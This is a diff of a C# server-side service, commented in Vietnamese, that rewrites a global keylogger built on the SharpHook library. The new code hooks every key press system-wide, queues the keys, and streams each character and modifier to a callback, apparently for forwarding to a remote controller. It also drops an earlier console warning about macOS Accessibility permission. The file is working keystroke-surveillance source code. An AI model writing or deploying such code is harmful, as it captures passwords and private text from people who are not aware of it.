@@ -2,160 +2,250 @@ using System;
 using System.Threading.Tasks;
 using SharpHook;
 using SharpHook.Native;
-using System.Runtime.InteropServices; // Thư viện này để lấy thông tin OS
+using SharpHook.Data;
+using System.Collections.Concurrent;
 using System.Threading;
 
 namespace Server.Services
 {
     public class InputService : IDisposable
     {
-        private TaskPoolGlobalHook _hook;
+        private EventLoopGlobalHook? _hook;
         private bool _isRunning = false;
-        private Action<string>? _onKeyDataReceived;
+        private Func<string, Task>? _onKeyDataReceived;
+        private ConcurrentQueue<string> _keyQueue = new ConcurrentQueue<string>();
+        private CancellationTokenSource? _cts;
+        private Task? _hookTask;
 
         public InputService()
         {
-            _hook = new TaskPoolGlobalHook();
-            _hook.KeyPressed += OnKeyPressed;
         }
 
-        public void StartKeyLogger(Action<string> callback)
+        public async Task StartKeyLogger(Func<string, Task> callback)
         {
-            if (_isRunning) return;
-            
-            // [SỬA] Cần re-initialize hook nếu nó đã bị Dispose trước đó để cho phép Restart
-            // Logic này đảm bảo việc bấm Start/Stop nhiều lần hoạt động
-            if (_hook == null || !_hook.IsRunning)
+            if (_isRunning || _hook != null)
             {
-                 _hook = new TaskPoolGlobalHook();
-                 _hook.KeyPressed += OnKeyPressed;
+                Console.Error.WriteLine(">>> StartKeyLogger: Hook đang chạy! Dừng trước...");
+                await StopKeyLogger();
+                await Task.Delay(200);
             }
-
+            
             _onKeyDataReceived = callback;
             _isRunning = true;
+            _cts = new CancellationTokenSource();
 
-            Task.Run(() => 
+            _hook = new EventLoopGlobalHook();
+            Console.Error.WriteLine("Hook instance created");
+            
+            // Đăng ký event handlers
+            _hook.KeyPressed += OnKeyPressedHandler;
+            _hook.KeyReleased += OnKeyReleasedHandler;
+            
+            Console.Error.WriteLine(">>> Event handlers registered");
+            
+            // Chạy hook trong background task
+            _hookTask = Task.Run(async () =>
             {
                 try
                 {
-                    Console.WriteLine($"Keylogger starting on {RuntimeInformation.OSDescription}.");
-                    
-                    // [NOTE MACOS] Thêm cảnh báo quyền
-                    if (RuntimeInformation.IsOSPlatform(OSPlatform.OSX))
-                    {
-                         Console.WriteLine("--- MACOS WARNING ---: Keylogging requires explicit 'Accessibility' permission. Please check system settings.");
-                    }
-                    
-                    _hook.Run(); // Lệnh này là blocking call
-                    Console.WriteLine("Keylogger stopped naturally.");
+                    Console.Error.WriteLine(">>> HOOK: Starting...");
+                    await _hook.RunAsync();
+                    Console.Error.WriteLine(">>> HOOK: Stopped");
                 }
                 catch (Exception ex)
                 {
-                    // Ngoại lệ này thường xảy ra khi Dispose được gọi
-                    if (!_hook.IsRunning)
+                    Console.Error.WriteLine($">>> HOOK ERROR: {ex.Message}");
+                    _isRunning = false;
+                }
+            });
+            
+            // Đợi hook khởi động
+            await Task.Delay(100);
+
+            // Consumer task để xử lý key queue
+            _ = Task.Run(async () =>
+            {
+                Console.Error.WriteLine(">>> CONSUMER: Started");
+                int processedCount = 0;
+                
+                while (_isRunning && !_cts.Token.IsCancellationRequested)
+                {
+                    if (_keyQueue.TryDequeue(out var key))
                     {
-                         Console.WriteLine("Keylogger stopped via Dispose.");
+                        processedCount++;
+                        Console.Error.WriteLine($">>> CONSUMER: Processing key #{processedCount}: '{key}'");
+                        Console.Write(key);
+                        
+                        if (_onKeyDataReceived != null)
+                        {
+                            try
+                            {
+                                await _onKeyDataReceived(key);
+                            }
+                            catch (Exception ex)
+                            {
+                                Console.Error.WriteLine($">>> CONSUMER ERROR: {ex.Message}");
+                            }
+                        }
                     }
                     else
                     {
-                        Console.WriteLine($"Keylogger error: {ex.Message}");
+                        await Task.Delay(5);
                     }
                 }
-                // Thiết lập lại cờ sau khi task hoàn thành
-                _isRunning = false;
+                
+                Console.Error.WriteLine($">>> CONSUMER: Stopped (processed {processedCount} keys)");
             });
+
+            Console.WriteLine("[SERVICE] Keylogger started");
+        }
+
+        private void OnKeyPressedHandler(object? sender, KeyboardHookEventArgs e)
+        {
+            var keyStr = FormatKeyFast(e.Data);
+            if (!string.IsNullOrEmpty(keyStr))
+            {
+                _keyQueue.Enqueue(keyStr);
+            }
         }
         
-        public void StopKeyLogger()
+        private void OnKeyReleasedHandler(object? sender, KeyboardHookEventArgs e)
         {
-            if (!_isRunning) return;
+            // Optional: handle key release events
+        }
+
+        public async Task StopKeyLogger()
+        {
+            Console.Error.WriteLine("\n>>> StopKeyLogger: Starting...");
             
-            // [SỬA] Đảm bảo gọi Dispose() để thoát khỏi vòng lặp hook.Run()
-            if (_hook.IsRunning)
+            _isRunning = false;
+            _cts?.Cancel();
+            
+            if (_hook != null)
             {
-                _onKeyDataReceived = null;
-                Console.WriteLine("Keylogger stopping...");
-                
-                // Dispose là cách duy nhất để dừng hook đang chạy
-                _hook.Dispose(); 
-            }
-        }
-
-        private void OnKeyPressed(object sender, KeyboardHookEventArgs e)
-        {
-            if (!_isRunning || _onKeyDataReceived == null) return;
-
-            var keyData = FormatKey(e.Data);
-
-            // [SỬA] Chỉ gọi Invoke nếu phím tạo ra ký tự (e.g., ignore Shift, Ctrl, Alt)
-            if (!string.IsNullOrEmpty(keyData))
-            {
-                 _onKeyDataReceived.Invoke(keyData);
-            }
-        }
-
-        // [FIX LỖI ASCII/CASE] Sử dụng data.KeyChar để ưu tiên ký tự đã được xử lý
-        private string FormatKey(KeyboardEventData data)
-        {
-            // 1. Nếu có ký tự Unicode/ASCII được tạo ra (Chữ, số, ký hiệu)
-            if (data.KeyChar != 0)
-            {
-                switch (data.KeyChar)
+                try
                 {
-                    case '\r': // Enter
-                    case '\n': return "{ENTER}";
-                    case '\t': return "{TAB}";
-                    case ' ': return " ";
-                    default:
-                         // Trả về ký tự đã được xử lý (Đúng case: a/A, 1/!)
-                        return data.KeyChar.ToString(); 
+                    Console.Error.WriteLine(">>> StopKeyLogger: Unsubscribing events...");
+                    _hook.KeyPressed -= OnKeyPressedHandler;
+                    _hook.KeyReleased -= OnKeyReleasedHandler;
+                    
+                    Console.Error.WriteLine(">>> StopKeyLogger: Disposing hook...");
+                    _hook.Dispose();
+                    
+                    Console.Error.WriteLine(">>> StopKeyLogger: Disposed");
                 }
+                catch (Exception ex)
+                {
+                    Console.Error.WriteLine($">>> StopKeyLogger ERROR: {ex.Message}");
+                }
+                _hook = null;
+            }
+            
+            if (_hookTask != null)
+            {
+                try
+                {
+                    await Task.WhenAny(_hookTask, Task.Delay(1000));
+                }
+                catch { }
+            }
+            
+            Console.Error.WriteLine(">>> StopKeyLogger: DONE\n");
+        }
+
+        private string FormatKeyFast(KeyboardEventData data)
+        {
+            var keyCode = data.KeyCode;
+            var keyChar = data.KeyChar;
+
+            // Handle modifier keys
+            switch (keyCode)
+            {
+                case KeyCode.VcLeftMeta:
+                case KeyCode.VcRightMeta: return "{CMD}";
+                case KeyCode.VcLeftShift:
+                case KeyCode.VcRightShift: return "{SHIFT}";
+                case KeyCode.VcLeftControl:
+                case KeyCode.VcRightControl: return "{CTRL}";
+                case KeyCode.VcLeftAlt:
+                case KeyCode.VcRightAlt: return "{ALT}";
             }
 
-            // 2. Phím đặc biệt (Modifiers, Functions, Arrows)
-            switch (data.KeyCode)
+            // Handle character keys
+            if (keyChar != 0 && keyChar != 0xFFFE && keyChar != 0xFFFF)
             {
-                case KeyCode.VcBackspace: return "{BACKSPACE}";
-                case KeyCode.VcDelete: return "{DELETE}";
-                case KeyCode.VcEscape: return "{ESC}";
-                case KeyCode.VcCapsLock: return "{CAPSLOCK}";
+                if (keyChar == '\r' || keyChar == '\n') return "{ENTER}";
+                if (keyChar == '\t') return "{TAB}";
+                if (keyChar == ' ') return " ";
+                return keyChar.ToString();
+            }
 
-                // [FIX] Các phím modifiers KHÔNG NÊN sinh ra log (trả về rỗng)
-                case KeyCode.VcLeftShift:
-                case KeyCode.VcRightShift:
-                case KeyCode.VcLeftControl:
-                case KeyCode.VcRightControl:
-                case KeyCode.VcLeftAlt:
-                case KeyCode.VcRightAlt:
-                case KeyCode.VcLeftMeta:
-                case KeyCode.VcRightMeta:
-                    return ""; 
-                    
-                case KeyCode.VcEnter: return "{ENTER}"; // Fallback cho ENTER nếu KeyChar = 0
-                case KeyCode.VcSpace: return " "; 
+            // Handle special keys by KeyCode
+            switch (keyCode)
+            {
+                case KeyCode.VcA: return "a";
+                case KeyCode.VcB: return "b";
+                case KeyCode.VcC: return "c";
+                case KeyCode.VcD: return "d";
+                case KeyCode.VcE: return "e";
+                case KeyCode.VcF: return "f";
+                case KeyCode.VcG: return "g";
+                case KeyCode.VcH: return "h";
+                case KeyCode.VcI: return "i";
+                case KeyCode.VcJ: return "j";
+                case KeyCode.VcK: return "k";
+                case KeyCode.VcL: return "l";
+                case KeyCode.VcM: return "m";
+                case KeyCode.VcN: return "n";
+                case KeyCode.VcO: return "o";
+                case KeyCode.VcP: return "p";
+                case KeyCode.VcQ: return "q";
+                case KeyCode.VcR: return "r";
+                case KeyCode.VcS: return "s";
+                case KeyCode.VcT: return "t";
+                case KeyCode.VcU: return "u";
+                case KeyCode.VcV: return "v";
+                case KeyCode.VcW: return "w";
+                case KeyCode.VcX: return "x";
+                case KeyCode.VcY: return "y";
+                case KeyCode.VcZ: return "z";
+                case KeyCode.Vc0: return "0";
+                case KeyCode.Vc1: return "1";
+                case KeyCode.Vc2: return "2";
+                case KeyCode.Vc3: return "3";
+                case KeyCode.Vc4: return "4";
+                case KeyCode.Vc5: return "5";
+                case KeyCode.Vc6: return "6";
+                case KeyCode.Vc7: return "7";
+                case KeyCode.Vc8: return "8";
+                case KeyCode.Vc9: return "9";
+                case KeyCode.VcSpace: return " ";
+                case KeyCode.VcEnter: return "{ENTER}";
+                case KeyCode.VcBackspace: return "{BACK}";
                 case KeyCode.VcTab: return "{TAB}";
-                
-                case KeyCode.VcPageUp: return "{PAGEUP}";
-                case KeyCode.VcPageDown: return "{PAGEDOWN}";
-                case KeyCode.VcEnd: return "{END}";
-                case KeyCode.VcHome: return "{HOME}";
-                case KeyCode.VcLeft: return "{LEFT}";
-                case KeyCode.VcUp: return "{UP}";
-                case KeyCode.VcRight: return "{RIGHT}";
-                case KeyCode.VcDown: return "{DOWN}";
-                
-                default:
-                    // Trả về mã phím nếu không có ký tự và không phải phím đặc biệt
-                    return $"[{data.KeyCode}]";
+                case KeyCode.VcMinus: return "-";
+                case KeyCode.VcEquals: return "=";
+                case KeyCode.VcOpenBracket: return "[";
+                case KeyCode.VcCloseBracket: return "]";
+                case KeyCode.VcSemicolon: return ";";
+                case KeyCode.VcQuote: return "'";
+                case KeyCode.VcComma: return ",";
+                case KeyCode.VcPeriod: return ".";
+                case KeyCode.VcSlash: return "/";
+                default: return "";
             }
         }
 
         public void Dispose()
         {
-            // [NOTE] Dừng hook khi service bị Dispose
-            StopKeyLogger();
-            // Clean up the hook object instance
-            _hook?.Dispose(); 
+            StopKeyLogger().GetAwaiter().GetResult();
+            GC.SuppressFinalize(this);
+        }
+
+        public async ValueTask DisposeAsync()
+        {
+            await StopKeyLogger();
+            GC.SuppressFinalize(this);
         }
     }
 }
